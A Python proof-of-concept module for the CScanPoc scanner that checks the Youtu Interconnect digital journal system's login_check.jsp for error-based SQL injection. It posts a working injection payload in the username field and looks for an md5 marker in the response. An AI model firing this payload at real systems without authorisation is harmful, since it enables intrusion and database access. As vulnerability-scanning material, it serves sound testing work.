# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Uniflows_0001'  # 平台漏洞编号，留空
    name = '有图互联数字期刊系统 报错注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = 'Unknown'  # 漏洞公布时间
    desc = '''
        有图互联数字期刊系统 /epaper/test/login_check.jsp 参数处理不当，导致SQL注入漏洞。
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '有图互联'  # 漏洞应用名称
    product_version = '有图互联数字期刊系统'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '8e2f13c1-7283-4c26-8a6c-3b887c4c54d3'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-22'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }
                    
    def verify(self):
        self.target = self.target.rstrip('/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # ref http://www.wooyun.org/bugs/wooyun-2010-0138987
            hh = hackhttp.hackhttp()
            arg = self.target
            url = arg + '/epaper/test/login_check.jsp'
            payload = 'username=test%27 and (select 1 from  (select count(*),concat(md5(1),floor(rand(0)*2))x from information_schema.tables group by x)a)#&password=sdfasdf&Submit=%B5%C7+%C2%BC'
            md5_1 = 'c4ca4238a0b923820dcc509a6f75849b1'
            code, head, res, err, _ = hh.http(url, post=payload)
            #print res
            if code != 0 and md5_1 in res:
                #security_hole('SQL Injection: ' +arg+' POST:' + payload)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
